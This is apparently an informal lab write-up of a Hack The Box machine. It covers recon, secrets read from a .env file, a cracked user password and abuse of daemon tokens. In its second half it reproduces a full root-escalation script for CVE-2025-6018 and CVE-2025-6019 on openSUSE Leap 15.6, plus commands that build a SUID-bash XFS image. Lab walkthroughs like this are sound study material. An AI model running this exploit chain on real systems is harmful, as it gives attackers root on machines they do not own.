## Machine Interpreter (Active) [Medium]

nmap scan:
```
❯ nmap -sV -T4 10.129.10.165
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-04 19:26 +0100
Nmap scan report for pterodactyl.htb (10.129.10.165)
Host is up (0.32s latency).
Not shown: 968 filtered tcp ports (no-response), 28 filtered tcp ports (admin-prohibited)
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 9.6 (protocol 2.0)
80/tcp   open   http       nginx 1.21.5
443/tcp  closed https
8080/tcp closed http-proxy

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.05 seconds
```
alr so an ssh port and a http port:\
let's see the website:\
![alt text](image.png)\
nothing interesting:\
lets check the changelog.txt attached at the bottom:\
![alt text](image-1.png)\
we can see there's the tech stack and its version, let's look for cve's related:\
yep, we find this:\
![alt text](image-2.png)\
after exploiting it, we can open a reverse shell, and there we are !:\
![alt text](image-3.png)\
user done, now let's get the root:\
well after looking further its running a mysql server, let's hunt for creds:\
after reading the .env we find this : 
```
wwwrun@pterodactyl:/var/www/pterodactyl> cat .env
APP_ENV=production
APP_DEBUG=false
APP_KEY=base64:UaThTPQnUjrrK61o+Luk7P9o4hM+gl4UiMJqcbTSThY=
APP_THEME=pterodactyl
APP_TIMEZONE=UTC
APP_URL="http://panel.pterodactyl.htb"
APP_LOCALE=en
APP_ENVIRONMENT_ONLY=false

LOG_CHANNEL=daily
LOG_DEPRECATIONS_CHANNEL=null
LOG_LEVEL=debug

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=panel
DB_USERNAME=pterodactyl
DB_PASSWORD=PteraPanel

REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

CACHE_DRIVER=redis
QUEUE_CONNECTION=redis
SESSION_DRIVER=redis

HASHIDS_SALT=pKkOnx0IzJvaUXKWt2PK
HASHIDS_LENGTH=8

```
alr so we can read the database and crack passwords:\
we are in: lets get users:\
we did:\
![alt text](image-4.png)\
now we simply crack their passwords we have the salt (we can ssh in their machines as they are both users on the machine:)\
we got `phileasfogg3:!QAZ2wsx` alr let's ssh in:\
we are in\
after getting stuck for an hour, i find this in a SECURITY.md in the app folder:
```
| Panel  | Daemon       | Supported          |
|--------|--------------|--------------------|
| 1.11.x | wings@1.11.x | :white_check_mark: |
| 0.7.x  | daemon@0.6.x | :x:                |

```
lets look for possible cve's, and yep:
https://nvd.nist.gov/vuln/detail/CVE-2026-26016#range-20789764 \
vulnerable to  	Authorization Bypass Through User-Controlled Key\
let's see how we can use it:\
well i was stuck, let's do it from the panel's website:\
![alt text](image-5.png)\
still nothing, let's read thouroughly what the cve is about:\

so it says we need wing daemon tokens; which can be found in ` /etc/pterodactyl/config.yml ` , we found them : 
```
token_id: fyqnJBhstNPUR8lN
token: nrV4yF4x7e0KkVaab4ptA1XZJwlExVJzUJnWqOeczWfTZnOb5avVzE9CynifW4ax
```
which means now that any node token can access any server, now we need to get servers, well they were available in the database:
```
MariaDB [panel]> SELECT id, uuid, name FROM servers;
+----+--------------------------------------+-------------+
| id | uuid                                 | name        |
+----+--------------------------------------+-------------+
| 11 | 60ff87f3-9431-415b-aa56-aa7720680266 | MonitorLand |
+----+--------------------------------------+-------------+

```
according to the cve, we can query ` GET /api/remote/servers/<uuid> `
```
phileasfogg3@pterodactyl:/var/www/pterodactyl> curl http://panel.pterodactyl.htb/api/remote/servers/60ff87f3-9431-415b-aa56-aa7720680266   -H "Authorization: Bearer fyqnJBhstNPUR8lN.nrV4yF4x7e0KkVaab4ptA1XZJwlExVJzUJnWqOeczWfTZnOb5avVzE9CynifW4ax"   -H "Accept: application/json"
{"settings":{"uuid":"60ff87f3-9431-415b-aa56-aa7720680266","meta":{"name":"MonitorLand","description":""},"suspended":false,"environment":{"BUNGEE_VERSION":"latest","SERVER_JARFILE":"bungeecord.jar","STARTUP":"java -Xms128M -XX:MaxRAMPercentage=95.0 -jar {{SERVER_JARFILE}}","P_SERVER_LOCATION":"gr.ath","P_SERVER_UUID":"60ff87f3-9431-415b-aa56-aa7720680266","P_SERVER_ALLOCATION_LIMIT":0},"invocation":"java -Xms128M -XX:MaxRAMPercentage=95.0 -jar {{SERVER_JARFILE}}","skip_egg_scripts":false,"build":{"memory_limit":1,"swap":0,"io_weight":500,"cpu_limit":0,"threads":null,"disk_space":1,"oom_disabled":true},"container":{"image":"ghcr.io\/pterodactyl\/yolks:java_21","oom_disabled":true,"requires_rebuild":false},"allocations":{"force_outgoing_ip":false,"default":{"ip":"192.168.202.20","port":25565},"mappings":{"192.168.202.20":[25565]}},"mounts":[],"egg":{"id":"e6ecafde-7df6-40d3-a290-5a7b9c563344","file_denylist":[]}},"process_configuration":{"startup":{"done":["Listening on "],"user_interaction":[],"strip_ansi":false},"stop":{"type":"command","value":"end"},"configs":[{"parser":"yaml","file":"config.yml","replace":[{"match":"listeners[0].query_port","replace_with":"25565"},{"match":"listeners[0].host","replace_with":"0.0.0.0:25565"},{"match":"servers.*.address","if_value":"regex:^(127\\.0\\.0\\.1|localhost)(:\\d{1,5})?$","replace_with":"{{config.docker.network.interface}}$2"}]}]}}
```

and yes, the cve worked, let's continue:\


well update, after a long time, this path is not it, well after asking for a nudge, i was directed to look for the os release, 
```
phileasfogg3@pterodactyl:/var/www/pterodactyl> cat /etc/os-release
NAME="openSUSE Leap"
VERSION="15.6"
ID="opensuse-leap"

```
and after looking forward: and i found this :
CVE-2025-6018 + CVE-2025-6019 Exploit Chain : https://github.com/MaxKappa/opensuse-leap-privesc-exploit \
alr let's do it:\
and this is the poc :\
```
#!/bin/bash
# CVE-2025-6018 + CVE-2025-6019 Exploit Chain
# openSUSE Leap 15.6: unprivileged -> allow_active -> root
# Usage: ./exploit.sh xfs.image

set -e

IMAGE_FILE="${1:-xfs.image}"

echo "========================================="
echo "  CVE-2025-6018 + CVE-2025-6019"
echo "  openSUSE Leap 15.6 LPE Chain"
echo "========================================="
echo ""

if [ ! -f "$IMAGE_FILE" ]; then
    echo "[-] XFS image not found: $IMAGE_FILE"
    exit 1
fi

echo "[*] XFS Image: $IMAGE_FILE ($(ls -lh "$IMAGE_FILE" | awk '{print $5}'))"

# CVE-2025-6018 - Gain allow_active

echo ""
echo "[STEP 1] CVE-2025-6018 - PAM Privilege Escalation"
echo "-------------------------------------------------"

CURRENT_PRIV=$(gdbus call --system \
    --dest org.freedesktop.login1 \
    --object-path /org/freedesktop/login1 \
    --method org.freedesktop.login1.Manager.CanReboot 2>/dev/null | grep -o "'[^']*'" | tr -d "'")

echo "[*] Current privilege level: $CURRENT_PRIV"

if [ "$CURRENT_PRIV" != "yes" ]; then
    
    if [ -f ~/.pam_environment ]; then
        if grep -q "XDG_SEAT OVERRIDE=seat0" ~/.pam_environment 2>/dev/null; then
            echo "[!] .pam_environment already configured but not active"
            echo "[!] You need to disconnect and reconnect SSH!"
            echo ""
            echo "    1. Exit this session: exit"
            echo "    2. Reconnect: ssh user@target"
            echo "    3. Run this script again: ./$0 $IMAGE_FILE"
            exit 1
        fi
    fi
    cat > ~/.pam_environment << 'EOF'
XDG_SEAT OVERRIDE=seat0
XDG_VTNR OVERRIDE=1
EOF
    
    echo "[+] Created ~/.pam_environment"
    echo ""
    echo "========================================="
    echo "  ACTION REQUIRED"
    echo "========================================="
    echo ""
    echo "[!] You MUST now:"
    echo "    1. Exit this SSH session: exit"
    echo "    2. Reconnect via SSH"
    echo "    3. Run this script again: ./$0 $IMAGE_FILE"
    echo ""
    echo "This is necessary for PAM to apply the new environment."
    echo ""
    exit 0
fi

echo ""
echo "[STEP 2] CVE-2025-6019 - UDisks2 LPE to root"
echo "--------------------------------------------"

killall -KILL gvfs-udisks2-volume-monitor 2>/dev/null || true

LOOP_OUTPUT=$(udisksctl loop-setup --file "$IMAGE_FILE" --no-user-interaction 2>&1)

LOOP_DEV=$(echo "$LOOP_OUTPUT" | grep -o 'loop[0-9]*' | tail -1)
if [ -z "$LOOP_DEV" ]; then
    echo "[-] Failed to setup loop device"
    echo "$LOOP_OUTPUT"
    exit 1
fi

echo "[+] Loop device: /dev/$LOOP_DEV"

(while true; do 
    /tmp/blockdev*/bash -p -c 'sleep 10; ls -l /tmp/blockdev*/bash' 2>/dev/null && break
done) &>/dev/null &

RACE_PID=$!
sleep 1

RESIZE_OUT=$(gdbus call --system \
    --dest org.freedesktop.UDisks2 \
    --object-path /org/freedesktop/UDisks2/block_devices/$LOOP_DEV \
    --method org.freedesktop.UDisks2.Filesystem.Resize \
    0 '{}' 2>&1)

echo "[*] Resize triggered: $RESIZE_OUT"

sleep 2

FOUND=0
for dir in /tmp/blockdev*/; do
    if [ -d "$dir" ]; then
        # Try to execute and check if we get root
        if "${dir}bash" -p -c 'id' 2>/dev/null | grep -q "euid=0"; then
            FOUND=1
            echo ""
            echo "[+] SUID bash found in: $dir"
            echo "[+] Spawning root shell..."
            echo ""
            kill $RACE_PID 2>/dev/null || true
            exec "${dir}bash" -p
        fi
    fi
done

if [ $FOUND -eq 0 ]; then
    echo ""
    echo "[-] Failed to get root shell"
    echo ""
    kill $RACE_PID 2>/dev/null || true
    exit 1
fi
```

but before that we need to create the XFS image first 
:
```
dd if=/dev/zero of=xfs.image bs=1M count=400
mkfs.xfs xfs.image
mkdir -p /tmp/mnt
mount xfs.image /tmp/mnt
cp /bin/bash /tmp/mnt/bash
chmod 04755 /tmp/mnt/bash
umount /tmp/mnt
```
(as root in my local machine)\
now we transfer with scp:\
and now we execute:\



well after hourse of trying, I can't, shitty box hhh